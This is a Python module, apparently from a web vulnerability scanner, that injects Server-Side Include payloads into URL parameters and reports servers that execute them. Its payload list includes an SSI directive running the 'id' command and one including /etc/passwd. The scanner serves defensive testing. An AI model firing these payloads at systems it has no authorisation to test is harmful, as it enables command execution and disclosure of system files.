import re
import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


PAYLOADS = ['<!--#exec cmd="id"-->', '<!--#echo var="DOCUMENT_NAME"-->', '<!--#include virtual="/etc/passwd"-->']
ERROR_PATTERNS = [('uid=|gid=|root:', 'SSI command execution output'), ('<!--#', 'SSI directive reflected')]


class ActiveSsiInjectionCheck(BaseCheck):
    name = "active_ssi_injection"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=15) as client:
            for param in target_params:
                for payload in PAYLOADS:
                    modified = self._inject_payload(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        for pattern, desc in ERROR_PATTERNS:
                            if re.search(pattern, resp.text, re.IGNORECASE):
                                results.append(CheckResult(
                                    triggered=True,
                                    severity="high",
                                    title="Server-Side Include Injection Detected",
                                    description="Parameter may be vulnerable to SSI injection. SSI directives sent as input were executed by the server.",
                                    evidence=f"Payload: {payload}\nResponse snippet: {resp.text[:300]}",
                                    remediation="Disable SSI if not required. Validate and sanitize all user input. Ensure user input is not embedded in SSI directives.",
                                    cwe="CWE-96",
                                ))
                                break
                    except httpx.TimeoutException:
                        results.append(CheckResult(
                            triggered=True,
                            severity="high",
                            title="Server-Side Include Injection Detected (Timeout)",
                            description="Request timed out with payload.",
                            evidence=f"Payload: {payload}",
                            remediation="Disable SSI if not required. Validate and sanitize all user input. Ensure user input is not embedded in SSI directives.",
                            cwe="CWE-96",
                        ))
                    except Exception:
                        continue

        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import copy
        import urllib.parse
        req = copy.deepcopy(base)
        parsed = urllib.parse.urlparse(req["url"])
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if param in params:
            params[param] = payload
            req["url"] = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
        return req
